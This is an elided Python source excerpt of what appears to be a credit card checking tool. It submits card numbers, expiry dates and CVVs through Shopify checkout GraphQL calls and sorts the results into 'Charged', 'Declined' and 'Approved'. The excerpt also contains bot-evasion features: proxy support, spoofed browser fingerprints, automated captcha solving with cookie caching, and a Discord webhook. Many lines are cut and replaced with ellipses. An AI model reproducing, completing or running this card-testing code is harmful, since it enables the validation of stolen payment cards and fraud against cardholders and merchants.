...
async def main():
    ...
    if proxy_url:
        ...
        print("   No proxy.")
    # Collect all user inputs BEFORE entering the async context manager
    # to avoid blocking the event loop with synchronous input() calls.
    ...
    async with _create_async_client(proxy_url=proxy_url, timeout=30.0, chrome_version=fingerprint.get("_chrome_ver")) as session:
        try:
            pass  # inputs already collected above
    ...
    if _is_captcha_result(result) and captcha_retries > 0 and _CAPTCHA_SOLVER_AVAILABLE:
        ...
        try:
            ...
            if solver_result.get("solved"):
                ...
                info2["price"] = result.get("price", "")
                info2["product"] = result.get("product", "")
                ...
                if status in ("Charged", "Declined", "Approved") and browser_cookies:
                    try:
                        from captcha_solver import cache_cookies as _cache_cookies
                        _cache_cookies(site_url, browser_cookies)
                    except Exception:
                        pass
            else:
...
async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, proxy_url=None, verbose=False, discord_console_webhook=None):
    ...
    stable_id = find_between(response_text2, 'stableId&quot;:&quot;', '&quot;')
    paymentMethodIdentifier = find_between(response_text2, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
    # ── Validate critical tokens — empty = checkout page format unknown / site blocked ──
    if not stable_id:
        return {"status": "Error", "message": "Checkout missing stableId (site may block bots or use new checkout)", "error_code": "SITE_INCOMPATIBLE", "debug_steps": _steps}
    if not paymentMethodIdentifier:
        return {"status": "Error", "message": "Checkout missing paymentMethodIdentifier (payment gateway not found)", "error_code": "SITE_INCOMPATIBLE", "debug_steps": _steps}
    ...
    if requires_shipping:
        ...
        if neg_got_receipt:
            ...
            if receipt.get("__typename") == "ProcessingReceipt":
                _next_poll_wait = 2.0  # Shopify typically takes 3-15s to process
                for poll_i in range(20):  # up to ~45s total before giving up
                    await asyncio.sleep(_next_poll_wait)
                    poll_r = await session.post(graphql_url, headers=_make_graphql_headers(), json={"query": _POLL_QUERY, "variables": {"receiptId": receipt_id, "sessionToken": session_token}, "operationName": "PollForReceipt"})
                    if poll_r.status_code != 200:
                        _next_poll_wait = min(_next_poll_wait + 1.0, 5.0)
                        continue
                    rec = poll_r.json().get("data", {}).get("receipt", {})
                    # Respect Shopify's suggested retry delay
                    _shopify_delay = rec.get("pollDelay")
                    _next_poll_wait = float(_shopify_delay) if _shopify_delay else min(_next_poll_wait + 0.5, 4.0)
        ...
        # ── Extract delivery_option_handle from negotiation response ──────────
        # Shopify returns the selected delivery strategy handle after negotiation.
        # Passing it in the final submit avoids DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE.
        try:
            neg_delivery_lines = (neg_data.get("data", {}).get("submitForCompletion", {}) or {}).get("receipt", {})
            if not neg_delivery_lines:
                # Try the negotiation response structure
                neg_sub = (neg_data.get("data", {}).get("submitForCompletion", {}) or {})
                neg_delivery_lines = neg_sub.get("receipt") or {}
            _doh = None
            _dl = neg_delivery_lines.get("deliveryLines") or []
            if _dl and isinstance(_dl, list):
                _ds = _dl[0].get("selectedDeliveryStrategy") or {}
                _doh = _ds.get("handle")
            if _doh:
                delivery_option_handle = _doh
        except Exception:
            pass  # keep delivery_option_handle as None
    ...
    for attempt in range(_max_submit_attempts):
        ...
        if completion.get("errors"):
            ...
            # Include first error code so _format_api_response can map it to a meaningful response
            _first_unclassified = error_codes[0] if error_codes else "UNKNOWN_ERROR"
            return {"status": "Error", "message": ", ".join(error_codes), "error_code": _first_unclassified, "product": product_title, "price": price, "debug_steps": _steps}
        ...
        if receipt.get("__typename") == "ProcessingReceipt":
            ...
            for poll_i in range(20):  # up to ~45s total before giving up
                await asyncio.sleep(_next_poll_wait)
                poll_r = await session.post(graphql_url, headers=graphql_headers, json={"query": _POLL_QUERY, "variables": {"receiptId": receipt_id, "sessionToken": session_token}, "operationName": "PollForReceipt"})
                if poll_r.status_code != 200:
                    _next_poll_wait = min(_next_poll_wait + 1.0, 5.0)
                    continue
